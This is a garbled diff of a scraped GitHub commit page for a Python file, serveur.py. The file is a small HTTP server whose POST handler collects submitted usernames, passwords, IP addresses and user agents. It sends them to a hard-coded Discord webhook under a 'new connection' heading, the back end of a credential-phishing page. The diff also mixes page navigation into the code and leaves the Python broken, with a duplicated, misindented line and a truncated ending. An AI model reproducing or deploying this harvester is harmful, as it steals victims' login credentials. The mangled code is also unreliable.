@@ -1,10 +1,52 @@
-import os
+
+Skip to content
+
+    RIX844
+    Unity
+
+Repository navigation
+
+Code
+Issues
+Pull requests
+Agents
+Actions
+Projects
+Wiki
+Security and quality
+Insights
+
+    Settings
+
+Commit 7233616
+RIX844
+RIX844
+authored
+Jul 31, 2026
+Update serveur.py
+main
+
+1 parent 
+6534a5e
+ commit 7233616
+
+1 file changed
++1-1Lines changed: 1 addition & 1 deletion
+File tree
+
+    serveur.py
+
+ 
+‎serveur.py‎
++1-1Lines changed: 1 addition & 1 deletion
+Original file line number	Diff line number	Diff line change
+@@ -1,46 +1,46 @@
+from http.server import HTTPServer, SimpleHTTPRequestHandler
 import json
 import datetime
 import urllib.request
-from http.server import HTTPServer, SimpleHTTPRequestHandler
 
-WEBHOOK_URL = "https://discord.com/api/webhooks/1532553921095270530/dP3FzsnWbetZfkPN3HuRAKDY_xNCgfNekonHvEPoE4F_NQRmA-6v6-BC5HWbmBc2nmkK"
+WEBHOOK_URL = "https://discord.com/api/webhooks/1532553921095270530/dP3FzsnWbetZfkPN3HuRAKDY_xNCgfNekonHwEPoE4F_MQRmA-6v6-BC5hWbmBc2mmWK"
 
 class MyHandler(SimpleHTTPRequestHandler):
     def do_POST(self):
@@ -20,27 +62,21 @@ class MyHandler(SimpleHTTPRequestHandler):
             now = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
 
             # Envoi vers Discord
+           msg = (
             msg = (
-                f"--- NOUVELLE CONNEXION [{now}] ---\n"
-                f"Utilisateur : {data.get('username')}\n"
-                f"Mot de passe : {data.get('password')}\n"
-                f"Adresse IP : {data.get('ip')}\n"
-                f"Localisation IP : https://ip-api.com/#{data.get('ip')}\n"
-                f"User-Agent : {data.get('userAgent')}\n"
-                f"Photo : {data.get('photo_url')}"
-            )
-
+        f"--- NOUVELLE CONNEXION [{now}] ---\n"
+        f"Utilisateur : {data.get('username')}\n"
+        f"Mot de passe : {data.get('password')}\n"
+        f"Adresse IP : {data.get('ip')}\n"
+        f"Localisation IP : https://ip-api.com/#{data.get('ip')}\n"
+        f"User-Agent : {data.get('userAgent')}"
+    )
             payload = json.dumps({"content": msg}).encode('utf-8')
-            req = urllib.request.Request(
-                WEBHOOK_URL,
-                data=payload,
-                headers={'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'}
-            )
-
+            req = urllib.request.Request(WEBHOOK_URL, data=payload, headers={'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'})
             try:
                 urllib.request.urlopen(req)
             except Exception as e:
-                print("Erreur envoi Discord :", e)
+                print("Erreur envoi Discord:", e)
 
             # Réponse JSON envoyée au navigateur
             self.send_response(200)
@@ -50,10 +86,11 @@ class MyHandler(SimpleHTTPRequestHandler):
         else:
             self.send_error(404, "Page non trouvée")
 
-# Lancement du serveur (port dynamique pour Render)
-if __name__ == '__main__':
-    port = int(os.environ.get('PORT', 8080))
-    server_address = ('', port)
-    httpd = HTTPServer(server_address, MyHandler)
-    print(f"Serveur lancé avec succès sur le port {port}...")
-    httpd.serve_forever()
+# Lancement du serveur
+server_address = ('', 8080)
+0 commit comments
+Comments
+0 (0)
+
+You're not receiving notifications from this thread.
+ 
